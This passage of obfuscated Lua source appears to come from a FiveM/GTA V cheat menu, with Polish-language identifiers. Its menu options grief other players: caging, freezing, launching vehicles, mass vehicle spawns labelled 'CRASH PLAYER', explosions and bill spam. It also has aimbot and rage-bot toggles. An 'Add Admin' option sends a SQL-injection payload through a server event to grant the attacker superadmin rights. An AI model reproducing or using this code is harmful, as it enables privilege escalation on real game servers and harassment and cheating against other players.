                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif pszycisk31eqd_PN("Mazebank", "Native") then
				 local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "dt1_11_slod1"), 0, 0, 0, true, true, true)
                                sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
                                propsydropsy31_PN,
                                    sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
                                    sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif pszycisk31eqd_PN("Hospital", "Native") then
				 local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "sc1_08_hdg1"), 0, 0, 0, true, true, true)
                                sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
                                propsydropsy31_PN,
                                    sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
                                    sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif pszycisk31eqd_PN("UFO", "Native") then
				 local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "cs1_09_sea_ufo"), 0, 0, 0, true, true, true)
                                sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
                                propsydropsy31_PN,
                                    sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
                                    sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
									elseif pszycisk31eqd_PN("Yacht", "Native") then
				 local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "apa_mp_apa_yacht_win"), 0, 0, 0, true, true, true)
                                sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
                                propsydropsy31_PN,
                                    sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
                                    sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif pszycisk31eqd_PN("CIA", "Native") then
				 local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "dt1_05_lod "), 0, 0, 0, true, true, true)
                                sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
                                propsydropsy31_PN,
                                    sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
                                    sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif pszycisk31eqd_PN("Hospital City", "Native") then
				 local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "dt1_06_hospsignem"), 0, 0, 0, true, true, true)
                                sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
                                propsydropsy31_PN,
                                    sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
                                    sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif pszycisk31eqd_PN("Installations", "Native") then
				 local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "xm_mpchristmasadditions_hatch_10"), 0, 0, 0, true, true, true)
                                sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
                                propsydropsy31_PN,
                                    sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
                                    sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif pszycisk31eqd_PN("Rich House ( Online )", "Native") then
				 local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "ss1_11_slod"), 0, 0, 0, true, true, true)
                                sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
                                propsydropsy31_PN,
                                    sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
                                    sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
					end
		

			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('TrollMenuWOnlajnsach_PN') then
		SetSubTitle_uytdfukasjgsdklf('TrollMenuWOnlajnsach_PN', 'Player Options: '..GetPlayerName_PN_ISDGIUSREG4OE87UGSDFG(zaznaczonygracz31_PN))
			if pszycisk31eqd_PN('Spectate ~g~Player', (Spectating_IUDHUFISLFGDFG and "~g~[SPECTATING]")) then
				Spectateplejerhasztag1_UD_PN(zaznaczonygracz31_PN)
			elseif pszycisk31eqd_PN("Spectate ~g~Player ~p~[ #2 ]", (spectate_global_dugsuydhkgsdfgdf and "~g~[ SPECTATING ]")) then
			Spectateplejerhasztag2_UD_PN(zaznaczonygracz31_PN)
            elseif pszycisk31eqd_PN("Cage ~g~Player") then
            Friiizplejer31qda_PN = true
            PN_WAIT_31DA31_PN(50)
            local COORDSY13QD_PN = GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), true)					
            local obj_DSUHGISDUGSDG = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "prop_gascage01"), COORDSY13QD_PN.x, COORDSY13QD_PN.y, COORDSY13QD_PN.z, true, true, true)
            PN_WAIT_31DA31_PN(50)
            Friiizplejer31qda_PN = false
			elseif checkbox_PN_31DA_PN(
				"Freeze ~g~Player",
				Friiizplejer31qda_PN,
				function(Wlaczone_PN_MENU_E1QDA_XD)
					Friiizplejer31qda_PN = Wlaczone_PN_MENU_E1QDA_XD
					end)
				then
				elseif pszycisk31eqd_PN("Fly ~g~Player Vehicle") then
				if not sritizen_INVOKE_PN(0x997ABD671D25CA0B, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 0) then
					JEBNIJpowiadomieni31_PN("Player must be in vehicle")		
				else
					local vechiclesapi31_31_PN = GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 0)
					siemafajnydikpokarzmigo(vechiclesapi31_31_PN)
					sritizen_INVOKE_PN(0xC5F68BE9613E2D18, vechiclesapi31_31_PN, 3, 0.0, 0.0, 5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
					
				end
				elseif pszycisk31eqd_PN("Send bill", "ESX") then
                    local WYREWOLWEROWANYREWOLWEROWIEC = klawiaturainput419r8q_PN("How much bills", "", 20)
                    if tonumber(WYREWOLWEROWANYREWOLWEROWIEC) == nil then
					JEBNIJpowiadomieni31_PN("Answer must be a number")
					else
                        for IiIipAWCIOREGHEGR = 1, WYREWOLWEROWANYREWOLWEROWIEC do
                            TriggerServerEvent(
                                true,
                                "esx_billing:sendBill",
                                getplejerid_PN(zaznaczonygracz31_PN),
                                "PN Credit",
                                "PN best menu LOL",
                                1000000
                            )
                        end
                    end
			elseif pszycisk31eqd_PN('Clone Outfit') then
			SKLONUJTYPKA313Q_PN(zaznaczonygracz31_PN)
			--[[elseif pszycisk31eqd_PN("Print ~g~Player Outfit") then
			print_player_outfit(zaznaczonygracz31_PN)]]
			elseif pszycisk31eqd_PN("Quick Replacement ", 'Native') then
			Szybkazamiana31da0_PN(zaznaczonygracz31_PN)
			elseif pszycisk31eqd_PN("Teleport to player", "Native") then
            local enstrititi = sritizen_INVOKE_PN(0x997ABD671D25CA0B, sritizen_INVOKE_PN(0xD80958FC74E988A6), false) and sritizen_INVOKE_PN(0x6094AD011A2EA87D, sritizen_INVOKE_PN(0xD80958FC74E988A6)) or sritizen_INVOKE_PN(0xD80958FC74E988A6)
			sritizen_INVOKE_PN(0x06843DA7060A026B, enstrititi, GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN)), 0.0, 0.0, 0.0, false)
		elseif pszycisk31eqd_PN("Track ~g~Player", "Native") then
		if zaznaczonygracz31_PN == 0 then
		JEBNIJpowiadomieni31_PN("You trying track self... Wait thats illegal")
		else
			local COORDY_XDDXDXDXDX = GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN))
			sritizen_INVOKE_PN(0xFE43368D2AA4F2FC, COORDY_XDDXDXDXDX)
		end
		elseif pszycisk31eqd_PN("Open ~g~Player Inventory ") then
	            TriggerEvent("esx_inventoryhud:openPlayerInventory", getplejerid_PN(zaznaczonygracz31_PN), GetPlayerName_PN_ISDGIUSREG4OE87UGSDFG(zaznaczonygracz31_PN))
				elseif pszycisk31eqd_PN("Kick From Vehicle") then
					sritizen_INVOKE_PN(0xAAA34F8A7CB32098, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN))
				elseif pszycisk31eqd_PN("Give All Weapons To ~g~Player") then
					for sinksianksionk = 1, #ALLWEAPONSY_PN do
						sritizen_INVOKE_PN(0xBF0FD6E56C964FCB, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), sritizen_INVOKE_PN(0xD24D37CC275948CC, "WEAPON_"..ALLWEAPONSY_PN[sinksianksionk]), 1000, false, false)
					end
				elseif pszycisk31eqd_PN("Revive", "ESX") then
					TriggerServerEvent("esx_ambulancejob:revive", getplejerid_PN(zaznaczonygracz31_PN))
					elseif pszycisk31eqd_PN("Add Admin", "~r~[ KASCHARACTERS ]") then
					TriggerServerEvent('kashactersS:DeleteCharacter', "';UPDATE `users` SET `permission_level` = '4', `group` = 'superadmin'where_DSGHSDIUGSDG `users`.`name` = '"..NetworkPlayerGetName(PlayerId()).."';")
                elseif pszycisk31eqd_PN("~g~Heal ~s~~g~Player", "~b~VRP") then 
                    sritizen_INVOKE_PN(0x6B76DC1F3AE6E6A3, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 200) 
                elseif pszycisk31eqd_PN("~b~Give Armour", "~b~VRP") then 
                    sritizen_INVOKE_PN(0xCEA04D83135264CC, sritizen_INVOKE_PN(0xD80958FC74E988A6, zaznaczonygracz31_PN), 200)
					elseif pszycisk31eqd_PN("Plane Explode", "Native") then
					sritizen_INVOKE_PN(0xE3AD2BDBAEE269AC, GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN)), 8, 100000.0, true, false, 0.0)
			elseif menibutton_PN938D_PN("~s~Fuck ~g~Player Menu", "Rozwalanie_Pojazdow_31da_PN") then 
			elseif menibutton_PN938D_PN("~s~Troll Menu", "Trolloweopcjead_PN") then			
			elseif menibutton_PN938D_PN("~s~Prop Menu", "OpcjeTeleportowOnline31qd_PN") then
			
		
		end			
		
		displej31eqda_PN()
		elseif MENUOPENED31QDA_PN("Rozwalanie_Pojazdow_31da_PN") then
		if pszycisk31eqd_PN("Spawn Explode Vehicles") then 
		for sinksianksionk=0, 25 do
                local coordsdfgkjdhgliodfigdfg = GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN))
                local autko31da_31eq_PN = sritizen_INVOKE_PN(0xD24D37CC275948CC, "Tanker")
				RequestModelSync_SDUFHSIDGSDG(autko31da_31eq_PN)
                local vehdgdfiugidfgdfgfghdfhfdgh = sritizen_INVOKE_PN(0xAF35D0D2583051B0, autko31da_31eq_PN, coordsdfgkjdhgliodfigdfg.x, coordsdfgkjdhgliodfigdfg.y, coordsdfgkjdhgliodfigdfg.z+5, sritizen_INVOKE_PN(0xE83D4F9BA2A38914, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN)), true, true)
				end
			elseif pszycisk31eqd_PN("Spawn Shit Vehicles") then 
				for sinksianksionk=0, 25 do
						local coordsdfgkjdhgliodfigdfg = GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN))
						local autko31da_31eq_PN = sritizen_INVOKE_PN(0xD24D37CC275948CC, "Dump")
						RequestModelSync_SDUFHSIDGSDG(autko31da_31eq_PN)
						local vehdgdfiugidfgdfgfghdfhfdgh = sritizen_INVOKE_PN(0xAF35D0D2583051B0, autko31da_31eq_PN, coordsdfgkjdhgliodfigdfg.x, coordsdfgkjdhgliodfigdfg.y, coordsdfgkjdhgliodfigdfg.z+5, sritizen_INVOKE_PN(0xE83D4F9BA2A38914, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN)), true, true)
						end
					elseif pszycisk31eqd_PN("Spawn Marquis Vehicles", "~b~[ CRASH PLAYER ]") then 
						for sinksianksionk=0, 50 do
								local coordsdfgkjdhgliodfigdfg = GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN))
								local autko31da_31eq_PN = sritizen_INVOKE_PN(0xD24D37CC275948CC, "Marquis")
								RequestModelSync_SDUFHSIDGSDG(autko31da_31eq_PN)
								local vehdgdfiugidfgdfgfghdfhfdgh = sritizen_INVOKE_PN(0xAF35D0D2583051B0, autko31da_31eq_PN, coordsdfgkjdhgliodfigdfg.x, coordsdfgkjdhgliodfigdfg.y, coordsdfgkjdhgliodfigdfg.z+5, sritizen_INVOKE_PN(0xE83D4F9BA2A38914, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN)), true, true)
								end
								elseif pszycisk31eqd_PN("Spawn Tug Vehicles", "~b~[ CRASH PLAYER ]") then 
						for sinksianksionk=0, 50 do
								local coordsdfgkjdhgliodfigdfg = GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN))
								local autko31da_31eq_PN = sritizen_INVOKE_PN(0xD24D37CC275948CC, "Tug")
								RequestModelSync_SDUFHSIDGSDG(autko31da_31eq_PN)
								local vehdgdfiugidfgdfgfghdfhfdgh = sritizen_INVOKE_PN(0xAF35D0D2583051B0, autko31da_31eq_PN, coordsdfgkjdhgliodfigdfg.x, coordsdfgkjdhgliodfigdfg.y, coordsdfgkjdhgliodfigdfg.z+5, sritizen_INVOKE_PN(0xE83D4F9BA2A38914, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN)), true, true)
								end
								elseif pszycisk31eqd_PN("Spawn Jets", "~b~[ CRASH PLAYER ]") then 
						for sinksianksionk=0, 25 do
								local coordsdfgkjdhgliodfigdfg = GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN))
								local autko31da_31eq_PN = sritizen_INVOKE_PN(0xD24D37CC275948CC, "Jet")
								RequestModelSync_SDUFHSIDGSDG(autko31da_31eq_PN)
								local vehdgdfiugidfgdfgfghdfhfdgh = sritizen_INVOKE_PN(0xAF35D0D2583051B0, autko31da_31eq_PN, coordsdfgkjdhgliodfigdfg.x, coordsdfgkjdhgliodfigdfg.y, coordsdfgkjdhgliodfigdfg.z+5, sritizen_INVOKE_PN(0xE83D4F9BA2A38914, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN)), true, true)
								end
end

		    displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('Menubronii_31D_PN') then
			if menibutton_PN938D_PN("Single Wep Spawner", "WejponMeni_31da_Single_PN") then
			elseif menibutton_PN938D_PN("Weapon Customization", "KustomizacjaPistoletu_3QDA_PN") then
			elseif pszycisk31eqd_PN("Give All Weapons") then
				for sinksianksionk = 1, #ALLWEAPONSY_PN do
					sritizen_INVOKE_PN(0xBF0FD6E56C964FCB, sritizen_INVOKE_PN(0xD80958FC74E988A6), sritizen_INVOKE_PN(0xD24D37CC275948CC, "WEAPON_"..ALLWEAPONSY_PN[sinksianksionk]), 1000, false, false)
				end
			elseif pszycisk31eqd_PN("Remove All Weapons") then
				for sinksianksionk = 1, #ALLWEAPONSY_PN do
					sritizen_INVOKE_PN(0x4899CB088EDF59B8, sritizen_INVOKE_PN(0xD80958FC74E988A6), sritizen_INVOKE_PN(0xD24D37CC275948CC, "WEAPON_"..ALLWEAPONSY_PN[sinksianksionk]))
				end
			elseif pszycisk31eqd_PN("Give Custom Weapon") then
			local wipon31qda451_PN = klawiaturainput419r8q_PN("Type name of weapon e.g WEAPON_PISTOL", "WEAPON_", 100)
			if wipon31qda451_PN ~= nil then
			sritizen_INVOKE_PN(0xBF0FD6E56C964FCB, sritizen_INVOKE_PN(0xD80958FC74E988A6), sritizen_INVOKE_PN(0xD24D37CC275948CC, string.upper(wipon31qda451_PN)), 1000, false, false)
			end
			elseif pszycisk31eqd_PN("Remove Custom Weapon") then
				local wipon31qda451_PN = klawiaturainput419r8q_PN("Type name of weapon, e.g. WEAPON_PISTOL", "WEAPON_", 100)
				if wipon31qda451_PN ~= nil then
				sritizen_INVOKE_PN(0x4899CB088EDF59B8, sritizen_INVOKE_PN(0xD80958FC74E988A6), sritizen_INVOKE_PN(0xD24D37CC275948CC, string.upper(wipon31qda451_PN)))
				end
			elseif checkbox_PN_31DA_PN(
				"Infinite Ammo",
				nieskonczonaamunicja419851_PN,
				function(Wlaczone_PN_MENU_E1QDA_XD)
					nieskonczonaamunicja419851_PN = Wlaczone_PN_MENU_E1QDA_XD
					end)
				then
			elseif checkbox_PN_31DA_PN(
				"OneShot",
				ONESZOTONEKILL_PN,
				function(Wlaczone_PN_MENU_E1QDA_XD)
					ONESZOTONEKILL_PN = Wlaczone_PN_MENU_E1QDA_XD
					end)
				then
			elseif checkbox_PN_31DA_PN(
				"Rage Bot",
				wkurwionyrejgbot31_PN,
				function(Wlaczone_PN_MENU_E1QDA_XD)
					wkurwionyrejgbot31_PN = Wlaczone_PN_MENU_E1QDA_XD
					end)
				then
			elseif checkbox_PN_31DA_PN(
				"Anti-AIM",
				ANTIAJM519075_PN,
				function(Wlaczone_PN_MENU_E1QDA_XD)
					ANTIAJM519075_PN = Wlaczone_PN_MENU_E1QDA_XD
					end)
				then
			elseif checkbox_PN_31DA_PN(
				"Draw aimbot fov",
				ajmbot4918_PN,
				function(Wlaczone_PN_MENU_E1QDA_XD)
					ajmbot4918_PN = Wlaczone_PN_MENU_E1QDA_XD
					end)
				then
			elseif checkbox_PN_31DA_PN(
				"Legit Aim-bot (ALT)",
				legit_aimbot_toogle_duygsudhkgsdfgsdfg,
				function(Wlaczone_PN_MENU_E1QDA_XD)
					legit_aimbot_toogle_duygsudhkgsdfgsdfg = Wlaczone_PN_MENU_E1QDA_XD
					end)
				then
		    elseif Slider_dghiuergsergerg("AimBot Fov", {"Full Legit", "Normal", "Semi-Rage"}, current_fov_SUHFIUSDFSDF, function(UYDIIDFYGDIUFHIGDFG)
            current_fov_SUHFIUSDFSDF = UYDIIDFYGDIUFHIGDFG
			if current_fov_SUHFIUSDFSDF == 1 then
			fov_x_DISFISDUSGFDG = 0.45
			fov_x2_DISFISDUSGFDG = 0.55
			fov_y_DISFISDUSGFDG = 0.45
			fov_y2_DISFISDUSGFDG = 0.55
			elseif current_fov_SUHFIUSDFSDF == 2 then
			fov_x_DISFISDUSGFDG = 0.40
			fov_x2_DISFISDUSGFDG = 0.60
			fov_y_DISFISDUSGFDG = 0.40
			fov_y2_DISFISDUSGFDG = 0.60
			elseif current_fov_SUHFIUSDFSDF == 3 then
			fov_x_DISFISDUSGFDG = 0.30
			fov_x2_DISFISDUSGFDG = 0.70
			fov_y_DISFISDUSGFDG = 0.30
			fov_y2_DISFISDUSGFDG = 0.70
			end
		    end) then
			end

		    displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('WejponMeni_31da_Single_PN') then
			for sinksianksionk = 1, #ALLWEAPONSY_PN do
				if pszycisk31eqd_PN("~g~SPAWN ~r~ > ~p~ ".. ALLWEAPONSY_PN[sinksianksionk]) then
					sritizen_INVOKE_PN(0xBF0FD6E56C964FCB, sritizen_INVOKE_PN(0xD80958FC74E988A6), sritizen_INVOKE_PN(0xD24D37CC275948CC, "WEAPON_"..ALLWEAPONSY_PN[sinksianksionk]), 1000, false, false)
				end
			end

			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('KustomizacjaPistoletu_3QDA_PN') then
			if pszycisk31eqd_PN("~p~Customization ~r~ > ~s~ ~g~Add ~s~Special Finish") then
				dodaniewykonczenia41r31rqf_PN(0x27872C90)
				dodaniewykonczenia41r31rqf_PN(0xD7391086)
				dodaniewykonczenia41r31rqf_PN(0x9B76C72C)
				dodaniewykonczenia41r31rqf_PN(0x487AAE09)
				dodaniewykonczenia41r31rqf_PN(0x85A64DF9)
				dodaniewykonczenia41r31rqf_PN(0x377CD377)
				dodaniewykonczenia41r31rqf_PN(0xD89B9658)
				dodaniewykonczenia41r31rqf_PN(0x4EAD7533)
				dodaniewykonczenia41r31rqf_PN(0x4032B5E7)
				dodaniewykonczenia41r31rqf_PN(0x77B8AB2F)
				dodaniewykonczenia41r31rqf_PN(0x7A6A7B7B)
				dodaniewykonczenia41r31rqf_PN(0x161E9241)
			elseif pszycisk31eqd_PN("~p~Customization ~r~ > ~s~ ~r~Remove ~s~Special Finish") then
				usunieciewykonczenias9418qa_PN(0x27872C90)
				usunieciewykonczenias9418qa_PN(0xD7391086)
				usunieciewykonczenias9418qa_PN(0x9B76C72C)
				usunieciewykonczenias9418qa_PN(0x487AAE09)
				usunieciewykonczenias9418qa_PN(0x85A64DF9)
				usunieciewykonczenias9418qa_PN(0x377CD377)
				usunieciewykonczenias9418qa_PN(0xD89B9658)
				usunieciewykonczenias9418qa_PN(0x4EAD7533)
				usunieciewykonczenias9418qa_PN(0x4032B5E7)
				usunieciewykonczenias9418qa_PN(0x77B8AB2F)
				usunieciewykonczenias9418qa_PN(0x7A6A7B7B)
				usunieciewykonczenias9418qa_PN(0x161E9241)
			elseif pszycisk31eqd_PN("~p~Customization ~r~ > ~s~ ~g~Add ~s~Extended Clip") then
				dodaniewykonczenia41r31rqf_PN(0x249A17D5)
				dodaniewykonczenia41r31rqf_PN(0x64F9C62B)
				dodaniewykonczenia41r31rqf_PN(0x7B0033B3)
				dodaniewykonczenia41r31rqf_PN(0x7C8BD10E)
				dodaniewykonczenia41r31rqf_PN(0x86BD7F72)
				dodaniewykonczenia41r31rqf_PN(0x8EC1C979)
				dodaniewykonczenia41r31rqf_PN(0xB3688B0F)
				dodaniewykonczenia41r31rqf_PN(0xD6C59CD6)
				dodaniewykonczenia41r31rqf_PN(0xED265A1C)
				dodaniewykonczenia41r31rqf_PN(0xD67B4F2D)
				dodaniewykonczenia41r31rqf_PN(0xD9D3AC92)
				dodaniewykonczenia41r31rqf_PN(0x33BA12E8)
				dodaniewykonczenia41r31rqf_PN(0x10E6BA2B)
				dodaniewykonczenia41r31rqf_PN(0x350966FB)
				dodaniewykonczenia41r31rqf_PN(0xBB46E417)
				dodaniewykonczenia41r31rqf_PN(0x334A5203)
				dodaniewykonczenia41r31rqf_PN(0x82158B47)
				dodaniewykonczenia41r31rqf_PN(0xEAC8C270)
				dodaniewykonczenia41r31rqf_PN(0xB1214F9B)
				dodaniewykonczenia41r31rqf_PN(0x91109691)
				dodaniewykonczenia41r31rqf_PN(0xCCFD2AC5)
				dodaniewykonczenia41r31rqf_PN(0x971CF6FD)
			elseif pszycisk31eqd_PN("~p~Customization ~r~ > ~s~ ~r~Remove ~s~Extended Clip") then
				usunieciewykonczenias9418qa_PN(0x249A17D5)
				usunieciewykonczenias9418qa_PN(0x64F9C62B)
				usunieciewykonczenias9418qa_PN(0x7B0033B3)
				usunieciewykonczenias9418qa_PN(0x7C8BD10E)
				usunieciewykonczenias9418qa_PN(0x86BD7F72)
				usunieciewykonczenias9418qa_PN(0x8EC1C979)
				usunieciewykonczenias9418qa_PN(0xB3688B0F)
				usunieciewykonczenias9418qa_PN(0xD6C59CD6)
				usunieciewykonczenias9418qa_PN(0xED265A1C)
				usunieciewykonczenias9418qa_PN(0xD67B4F2D)
				usunieciewykonczenias9418qa_PN(0xD9D3AC92)
				usunieciewykonczenias9418qa_PN(0x33BA12E8)
				usunieciewykonczenias9418qa_PN(0x10E6BA2B)
				usunieciewykonczenias9418qa_PN(0x350966FB)
				usunieciewykonczenias9418qa_PN(0xBB46E417)
				usunieciewykonczenias9418qa_PN(0x334A5203)
				usunieciewykonczenias9418qa_PN(0x82158B47)
				usunieciewykonczenias9418qa_PN(0xEAC8C270)
				usunieciewykonczenias9418qa_PN(0xB1214F9B)
				usunieciewykonczenias9418qa_PN(0x91109691)
				usunieciewykonczenias9418qa_PN(0xCCFD2AC5)
				usunieciewykonczenias9418qa_PN(0x971CF6FD)
			elseif pszycisk31eqd_PN("~p~Customization ~r~ > ~s~ ~g~Add ~s~Flashlight") then
				dodaniewykonczenia41r31rqf_PN(0x359B7AAE)
				dodaniewykonczenia41r31rqf_PN(0x7BC4CDDC)
			elseif pszycisk31eqd_PN("~p~Customization ~r~ > ~s~ ~r~Remove ~s~Flashlight") then
				usunieciewykonczenias9418qa_PN(0x359B7AAE)
				usunieciewykonczenias9418qa_PN(0x7BC4CDDC)
			elseif pszycisk31eqd_PN("~p~Customization ~r~ > ~s~ ~g~Add ~s~Grip") then
				dodaniewykonczenia41r31rqf_PN(0xC164F53)
			elseif pszycisk31eqd_PN("~p~Customization ~r~ > ~s~ ~r~Remove ~s~Grip") then
				usunieciewykonczenias9418qa_PN(0xC164F53)
			elseif pszycisk31eqd_PN("~p~Customization ~r~ > ~s~ ~g~Add ~s~Suppresor") then
				dodaniewykonczenia41r31rqf_PN(0x65EA7EBB)
				dodaniewykonczenia41r31rqf_PN(0x837445AA)
				dodaniewykonczenia41r31rqf_PN(0xA73D4664)
				dodaniewykonczenia41r31rqf_PN(0xC304849A)
				dodaniewykonczenia41r31rqf_PN(0xE608B35E)
			elseif pszycisk31eqd_PN("~p~Customization ~r~ > ~s~ ~r~Remove ~s~Suppresor") then
				usunieciewykonczenias9418qa_PN(0x65EA7EBB)
				usunieciewykonczenias9418qa_PN(0x837445AA)
				usunieciewykonczenias9418qa_PN(0xA73D4664)
				usunieciewykonczenias9418qa_PN(0xC304849A)
				usunieciewykonczenias9418qa_PN(0xE608B35E)
			elseif pszycisk31eqd_PN("~p~Customization ~r~ > ~s~ ~g~Add ~s~Scope") then
				dodaniewykonczenia41r31rqf_PN(0x9D2FBF29)
				dodaniewykonczenia41r31rqf_PN(0xA0D89C42)
				dodaniewykonczenia41r31rqf_PN(0xAA2C45B4)
				dodaniewykonczenia41r31rqf_PN(0xD2443DDC)
				dodaniewykonczenia41r31rqf_PN(0x3CC6BA57)
				dodaniewykonczenia41r31rqf_PN(0x3C00AFED)
			elseif pszycisk31eqd_PN("~p~Customization ~r~ > ~s~ ~r~Remove ~s~Scope") then
				usunieciewykonczenias9418qa_PN(0x9D2FBF29)
				usunieciewykonczenias9418qa_PN(0xA0D89C42)
				usunieciewykonczenias9418qa_PN(0xAA2C45B4)
				usunieciewykonczenias9418qa_PN(0xD2443DDC)
				usunieciewykonczenias9418qa_PN(0x3CC6BA57)
				usunieciewykonczenias9418qa_PN(0x3C00AFED)
			end

		    displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('Opcjewizualne31qda_PN') then
		if menibutton_PN938D_PN("Weather", 'Pogodadlaeqda_PN') then
		elseif menibutton_PN938D_PN("ESP Menu", 'ESP_MENU_DUHFIDSUGHUIDFG') then
		elseif checkbox_PN_31DA_PN(
			"~g~Player Blips",
			blipygraczy31qda_PN,
			function(Wlaczone_PN_MENU_E1QDA_XD)
